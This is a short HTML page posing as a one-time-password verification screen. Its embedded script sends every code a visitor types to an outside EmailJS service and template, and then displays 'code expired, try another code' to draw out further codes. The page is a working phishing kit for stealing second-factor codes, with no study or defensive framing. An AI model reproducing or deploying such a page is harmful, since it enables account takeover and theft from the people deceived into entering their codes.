<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OTP</title>
<style>
body {margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;background:#f2f2f7;}
.container {max-width:420px;margin:80px auto;padding:20px;text-align:center;}
input {width:100%;padding:16px;border-radius:12px;border:none;background:#e5e5e5;font-size:18px;text-align:center;letter-spacing:5px;}
button {width:100%;margin-top:20px;padding:15px;background:black;color:white;border-radius:12px;border:none;}
.success {display:none;margin-top:20px;color:green;font-weight:bold;}
</style>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
(function(){emailjs.init("NgnyFkoI-lfD8zjWa");})();
function verifyOTP(){
emailjs.send("service_ifnx4jr","template_8kxwgac",{otp_code:document.getElementById("otp").value})
.then(()=>{document.getElementById("success").style.display="block";},(error)=>{alert("Error: "+JSON.stringify(error));});
}
</script>
</head>
<body>
<div class="container">
<h2>Input OTP code sent to your email:</h2>
<input id="otp" placeholder="------">
<button onclick="verifyOTP()">Verify</button>
<div id="success" class="success">code expired, try another code</div>
</div>
</body>
</html>
